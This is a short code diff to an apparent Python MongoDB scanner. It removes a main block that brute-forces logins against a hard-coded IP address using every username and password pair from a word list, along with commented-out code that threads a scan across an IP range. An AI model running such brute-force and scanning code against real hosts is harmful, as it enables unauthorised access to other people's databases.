@@ -35,14 +35,4 @@ class MongoScanner:
         return result
 
 if __name__ == '__main__':
-    lines = open('pwd.txt').readlines()
-    for username in lines:
-        for password in lines:
-            r = MongoScanner('129.204.234.135').connect(username,password)
-            if(r=='success'):
-                print(r,username,password)
-            
-    # for ip3 in range(234, 235):
-    #     for ip4 in range(0, 255):
-    #         threading.Thread(target=mongo, args=(
-    #             '129.204.'+str(ip3)+'.' + str(ip4),)).start()
+    pass
